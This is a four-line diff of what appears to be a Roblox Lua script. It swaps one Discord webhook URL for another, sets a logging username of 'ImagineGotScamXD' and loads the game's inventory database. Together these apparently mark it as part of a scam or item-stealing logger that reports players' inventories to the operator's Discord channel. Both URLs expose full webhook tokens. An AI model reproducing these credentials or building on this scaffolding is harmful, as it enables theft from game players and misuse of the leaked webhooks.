@@ -1,4 +1,4 @@
-local LogsWebhook = "https://discord.com/api/webhooks/1312001391698513970/MS7LurLnJQvDpWC7UaGqcZX1-id52qxe8JCy_8TPmLL5kHZoZ4WTmkKskyzsBk-0bwTz"
+local LogsWebhook = "https://discord.com/api/webhooks/1309897171369197588/Es13EP_U_GLWFjJrAwXPasVMU_0h61c3um6K5GNT4z_YJugWa6TGw2m6XNkpV_Y6rWgL"
 local LogsUsername = "ImagineGotScamXD"
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
